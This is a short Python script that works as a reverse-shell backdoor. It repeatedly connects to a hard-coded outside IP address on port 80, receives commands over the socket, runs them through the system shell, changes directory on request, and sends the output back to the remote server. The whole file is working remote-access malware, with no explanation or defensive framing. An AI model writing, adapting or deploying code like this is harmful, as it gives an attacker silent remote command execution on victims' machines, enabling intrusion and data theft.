import time
import subprocess
import socket 
import os

SERVER_IP = "129.150.59.67"
PORT = 80
current_dir = os.getcwd()
print(current_dir)

def connect_to_server():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((SERVER_IP, PORT))
            return client
        except ConnectionRefusedError:
            print("no server to connect to\n retrying in 10 seconds")
            time.sleep(10)
        
def execute(cmd):
    global current_dir
    cmd = cmd.strip()
    if not cmd:
        return ""
    if cmd.startswith("cd"):
        path =cmd[3:].strip()
        try:
            os.chdir(path)
            current_dir = os.getcwd()
        except Exception as e:
            return f"error changing directory {e}"
    try:
        result = subprocess.check_output(
            cmd,
            stderr=subprocess.STDOUT,
            shell=True,
            cwd=current_dir
        )
        return result.decode("utf-8")
    except Exception as e:
        print(e)

client = connect_to_server()

while True:
    try:
        cmd = client.recv(4095).decode("utf-8")
        if not cmd:
            raise ConnectionError("Connection Failed")
        result = execute(cmd)
        if result:    
            client.send(result.encode("utf-8"))
    except (ConnectionAbortedError, ConnectionError, ConnectionResetError) as e:
        print(f"Connection error{e}")
        client = connect_to_server()
    except Exception as e:
        print(f"Critical error {e}")
        client.close()
        time.sleep(5)
        client = connect_to_server()




